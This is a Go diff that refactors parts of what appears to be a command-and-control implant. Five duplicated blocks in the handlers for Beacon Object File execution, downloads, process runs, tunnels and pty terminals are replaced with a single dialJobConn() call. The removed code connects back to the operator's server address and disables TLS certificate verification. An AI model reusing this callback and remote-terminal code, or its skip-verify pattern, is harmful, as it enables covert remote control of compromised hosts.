@@ -6,8 +6,6 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
-	"crypto/tls"
-	"crypto/x509"
 	"encoding/base64"
 	"errors"
 	"fmt"
@@ -645,26 +643,7 @@ func jobExecBofAsync(paramsData []byte) ([]byte, error) {
 		return nil, errLoad
 	}
 
-	var conn net.Conn
-	if profile.UseSSL {
-		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
-		if certerr != nil {
-			return nil, err
-		}
-
-		caCertPool := x509.NewCertPool()
-		caCertPool.AppendCertsFromPEM(profile.CaCert)
-
-		config := &tls.Config{
-			Certificates:       []tls.Certificate{cert},
-			RootCAs:            caCertPool,
-			InsecureSkipVerify: true,
-		}
-		conn, err = tls.Dial("tcp", profile.Addresses[0], config)
-
-	} else {
-		conn, err = net.Dial("tcp", profile.Addresses[0])
-	}
+	conn, err := dialJobConn()
 	if err != nil {
 		return nil, err
 	}
@@ -871,26 +850,7 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	var conn net.Conn
-	if profile.UseSSL {
-		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
-		if certerr != nil {
-			return nil, err
-		}
-
-		caCertPool := x509.NewCertPool()
-		caCertPool.AppendCertsFromPEM(profile.CaCert)
-
-		config := &tls.Config{
-			Certificates:       []tls.Certificate{cert},
-			RootCAs:            caCertPool,
-			InsecureSkipVerify: true,
-		}
-		conn, err = tls.Dial("tcp", profile.Addresses[0], config)
-
-	} else {
-		conn, err = net.Dial("tcp", profile.Addresses[0])
-	}
+	conn, err := dialJobConn()
 	if err != nil {
 		return nil, err
 	}
@@ -1011,27 +971,7 @@ func jobRun(paramsData []byte) ([]byte, error) {
 		pid = cmd.Process.Pid
 	}
 
-	var conn net.Conn
-	if profile.UseSSL {
-		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
-		if certerr != nil {
-			procCancel()
-			return nil, err
-		}
-
-		caCertPool := x509.NewCertPool()
-		caCertPool.AppendCertsFromPEM(profile.CaCert)
-
-		config := &tls.Config{
-			Certificates:       []tls.Certificate{cert},
-			RootCAs:            caCertPool,
-			InsecureSkipVerify: true,
-		}
-		conn, err = tls.Dial("tcp", profile.Addresses[0], config)
-
-	} else {
-		conn, err = net.Dial("tcp", profile.Addresses[0])
-	}
+	conn, err := dialJobConn()
 	if err != nil {
 		procCancel()
 		return nil, err
@@ -1289,26 +1229,7 @@ func jobTunnel(paramsData []byte) {
 			}
 		}
 
-		var srvConn net.Conn
-		if profile.UseSSL {
-			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
-			if certerr != nil {
-				return
-			}
-
-			caCertPool := x509.NewCertPool()
-			caCertPool.AppendCertsFromPEM(profile.CaCert)
-
-			config := &tls.Config{
-				Certificates:       []tls.Certificate{cert},
-				RootCAs:            caCertPool,
-				InsecureSkipVerify: true,
-			}
-			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
-
-		} else {
-			srvConn, err = net.Dial("tcp", profile.Addresses[0])
-		}
+		srvConn, err := dialJobConn()
 		if err != nil {
 			srvConn.Close()
 			return
@@ -1434,26 +1355,7 @@ func jobTerminal(paramsData []byte) {
 			status = err.Error()
 		}
 
-		var srvConn net.Conn
-		if profile.UseSSL {
-			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
-			if certerr != nil {
-				return
-			}
-
-			caCertPool := x509.NewCertPool()
-			caCertPool.AppendCertsFromPEM(profile.CaCert)
-
-			config := &tls.Config{
-				Certificates:       []tls.Certificate{cert},
-				RootCAs:            caCertPool,
-				InsecureSkipVerify: true,
-			}
-			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
-
-		} else {
-			srvConn, err = net.Dial("tcp", profile.Addresses[0])
-		}
+		srvConn, err := dialJobConn()
 		if err != nil {
 			if active {
 				functions.StopPty(ptyProc)
